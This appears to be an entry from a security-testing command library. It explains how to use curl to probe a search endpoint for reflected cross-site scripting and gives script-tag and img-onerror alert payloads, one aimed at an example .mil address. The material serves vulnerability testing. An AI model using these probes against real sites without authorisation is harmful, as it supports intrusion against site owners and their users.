---
data: >-
  curl -G "https://example.dod.mil/search" --data-urlencode
  "q=<script>alert('XSS')</script>"
tags:
  - xss
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 85a540d7-767e-4471-a08f-181b60e529cb
created_at: '2025-12-14T03:15:31.135Z'
updated_at: '2025-12-14T03:15:31.135Z'
verified: false
validated: true
submitted: true
---
# curl-test-reflected-xss

## Command

```bash
curl -G "https://example.dod.mil/search" --data-urlencode "q=<script>alert('XSS')</script>"
```

## Description

This command uses curl to send a GET request to a target URL with a URL-encoded XSS payload in a parameter, testing for reflected XSS by checking if the payload appears unescaped in the response. It is useful for initial vulnerability verification without a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | Treats the following arguments as GET parameters | Yes |
| `--data-urlencode` | URL-encodes the data (e.g., the payload) | Yes |
| `q=<script>alert('XSS')</script>` | The vulnerable parameter and payload | Yes |
| URL | The target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -G "https://target.com/search" --data-urlencode "q=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -G -v "https://target.com/search" --data-urlencode "q=<img src=x onerror=alert('XSS')>" -o response.html
```

> The -v flag adds verbose output, and -o saves the response for inspection.

## Expected Output

The command outputs the HTML response. Look for the unencoded payload (e.g., <script>alert('XSS')</script>) in the body, indicating reflection without sanitization. Successful XSS would show the script tag intact.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-via-Malicious-URL]]
